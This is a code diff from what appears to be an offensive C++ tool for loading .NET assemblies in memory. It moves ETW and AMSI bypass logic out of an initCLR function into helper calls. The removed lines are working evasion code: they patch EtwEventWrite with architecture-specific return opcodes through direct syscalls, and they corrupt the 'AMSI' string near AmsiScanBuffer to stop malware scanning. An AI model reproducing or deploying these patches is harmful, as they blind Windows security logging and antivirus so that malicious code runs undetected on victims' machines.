@@ -465,6 +465,8 @@ void* findStringInMemory(const char* target, void* startAddress, int lenght)
 }
 
 
+#include "Tools.hpp"
+
 // https://www.coresecurity.com/core-labs/articles/running-pes-inline-without-console
 // https://github.com/fortra/No-Consolation/blob/main/source/console.c
 // https://kiewic.github.io/set-a-breakpoint-in-managed-code-cs-using-windbg
@@ -473,57 +475,7 @@ void* findStringInMemory(const char* target, void* startAddress, int lenght)
 int DotnetExec::initCLR()
 {
     // Patch EtwEventWrite
-    bool isPatchEtw = true;
-    if(isPatchEtw)
-    {
-        void * pEventWrite = (void*)GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
-        
-        HANDLE hProc=(HANDLE)-1;
-
-        DWORD oldprotect = 0;
-        // VirtualProtect(pEventWrite, 1024, PAGE_READWRITE, &oldprotect);
-
-        HANDLE hProcess = GetCurrentProcess();
-        SIZE_T dwSize = 1024;
-        Sw3NtProtectVirtualMemory_(hProcess, &pEventWrite, &dwSize, PAGE_READWRITE, &oldprotect);
-
-        #if defined(_M_ARM64) || defined(__aarch64__)
-            char patch[] = "\x00\x00\x80\x52\xc0\x03\x5f\xd6"; // mov w0, #0; ret
-            int patchSize = 8;
-        #elif defined(_WIN64)
-            char patch[] = "\x48\x33\xc0\xc3"; // xor rax, rax; ret
-            int patchSize = 4;
-        #else
-            char patch[] = "\x33\xc0\xc2\x14\x00"; // xor eax, eax; ret 14
-            int patchSize = 5;
-        #endif
-        
-         WriteProcessMemory(hProc, pEventWrite, (PVOID)patch, patchSize, nullptr);
-
-        // VirtualProtect(pEventWrite, 1024, oldprotect, &oldprotect);
-        Sw3NtProtectVirtualMemory_(hProcess, &pEventWrite, &dwSize, oldprotect, &oldprotect);
-    }
-
-    // Patch AMSI
-    HMODULE hAmsi = LoadLibrary("amsi.dll");
-    std::string target = "AMSI";
-    BYTE* baseAddress = (BYTE*)GetProcAddress(hAmsi, "AmsiScanBuffer");
-    int lenght = 0x100;
-
-    void* address = findStringInMemory(target.c_str(), (void*)baseAddress, lenght);
-    if(address)
-    {
-        DWORD oldprotect = 0;
-        VirtualProtect(address, 1024, PAGE_READWRITE, &oldprotect);
-
-        std::string patch = "ASMI";
-        memcpy( (void*)(address), (void*)(patch.c_str()), patch.size());
-
-        VirtualProtect(address, 1024, oldprotect, &oldprotect);
-    }
-    else
-    {
-    }
+    patchEtw();
 
     HMODULE hMscoree = LoadLibrary("mscoree.dll");
 
@@ -571,6 +523,9 @@ int DotnetExec::initCLR()
     hr = m_spAppDomainThunk->QueryInterface(IID_PPV_ARGS(&m_spDefaultAppDomain));
     if (FAILED(hr))
         return ERROR_INIT_CLR_8;
+
+    // Patch AMSI
+    patchAmsiClr();
 
     m_targetAssembly = new TargetAssembly();
     m_pCustomHostControl->setTargetAssembly(m_targetAssembly);
